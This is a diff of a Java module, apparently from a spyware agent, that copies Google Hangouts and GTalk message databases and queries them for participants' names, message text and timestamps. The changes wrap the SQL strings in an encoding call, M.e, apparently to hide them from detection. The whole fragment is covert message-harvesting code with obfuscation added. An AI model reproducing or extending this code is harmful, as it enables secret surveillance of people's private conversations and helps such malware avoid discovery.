@@ -100,7 +100,8 @@ public class ChatGoogle extends SubModuleChat {
 		//	saveContacts(helper);
 		//}
 	
-		String sql_c = "select cp.conversation_id, latest_message_timestamp, full_name, latest_message_timestamp from conversations as c join conversation_participants as cp on c.conversation_id=cp.conversation_id join participants as p on  cp.participant_row_id=p._id";
+		String sql_c = M.e("select cp.conversation_id, latest_message_timestamp, full_name, latest_message_timestamp from conversations as c ") +
+				M.e("join conversation_participants as cp on c.conversation_id=cp.conversation_id join participants as p on  cp.participant_row_id=p._id");
 		
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
 		helper.deleteAtEnd = false;
@@ -135,8 +136,9 @@ public class ChatGoogle extends SubModuleChat {
 	private long fetchHangoutMessages(GenericSqliteHelper helper, final HangoutConversation conversation, final ChatGroups groups, long lastTimestamp) {
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 		
-		String sql_m = String.format("select m._id, full_name, fallback_name ,text, timestamp, type, p.chat_id " +
-				"from messages as m join participants as p on m.author_chat_id = p.chat_id where type<3 and conversation_id='%s' and timestamp>%s", conversation.id, lastTimestamp);
+		String sql_m = String.format(M.e("select m._id, full_name, fallback_name ,text, timestamp, type, p.chat_id ") +
+				M.e("from messages as m join participants as p on m.author_chat_id = p.chat_id where type<3 and conversation_id='%s' and timestamp>%s"), 
+				conversation.id, lastTimestamp);
 		
 		RecordVisitor visitor = new RecordVisitor() {
 
@@ -248,8 +250,7 @@ public class ChatGoogle extends SubModuleChat {
 			}
 		};
 
-		String sqlquery = M
-				.e("select  p.chat_id, full_name, fallback_name, cp.conversation_id from conversation_participants as cp join participants as p on  cp.participant_row_id=p._id where conversation_id=?");
+		String sqlquery = M.e("select  p.chat_id, full_name, fallback_name, cp.conversation_id from conversation_participants as cp join participants as p on  cp.participant_row_id=p._id where conversation_id=?");
 		helper.traverseRawQuery(sqlquery, new String[] { thread_id }, visitor);
 	}
 
@@ -377,8 +378,7 @@ public class ChatGoogle extends SubModuleChat {
 	private long fetchGTalkMessages(GenericSqliteHelper helper, long lastLine) {
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-		String sqlquery = M
-				.e("select m.date, ac.name, m.type, body, co.username, co.nickname from messages as m join  contacts as co on m.thread_id = co._id join accounts as ac on co.account = ac._id where m.consolidation_key is null and m.type<=1 and m.date>?");
+		String sqlquery = M.e("select m.date, ac.name, m.type, body, co.username, co.nickname from messages as m join  contacts as co on m.thread_id = co._id join accounts as ac on co.account = ac._id where m.consolidation_key is null and m.type<=1 and m.date>?");
 		RecordVisitor visitor = new RecordVisitor() {
 
 			@Override
